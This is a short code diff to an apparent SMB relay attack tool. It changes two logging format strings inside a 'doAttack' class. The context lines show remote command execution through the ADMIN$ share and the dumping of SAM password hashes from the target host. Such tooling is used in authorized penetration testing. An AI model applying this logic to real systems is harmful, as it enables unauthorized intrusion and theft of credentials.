@@ -141,7 +141,7 @@ class doAttack(Thread):
             try:
                 if self.__command is not None:
                     remoteOps._RemoteOperations__executeRemote(self.__command)
-                    logging.info("Executed specified command on host: %s", self.__SMBConnection.getRemoteHost())
+                    logging.info("Executed specified command on host: %s" % self.__SMBConnection.getRemoteHost())
                     self.__answerTMP = b''
                     self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
                     logging.debug('Raw answer %r' % self.__answerTMP)
@@ -161,7 +161,7 @@ class doAttack(Thread):
                     samFileName = remoteOps.saveSAM()
                     samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
                     samHashes.dump()
-                    logging.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
+                    logging.info("Done dumping SAM hashes for host: %s" % self.__SMBConnection.getRemoteHost())
             except Exception as e:
                 logging.debug('Exception:', exc_info=True)
                 ATTACKED_HOSTS.remove(self.__SMBConnection.getRemoteHost())
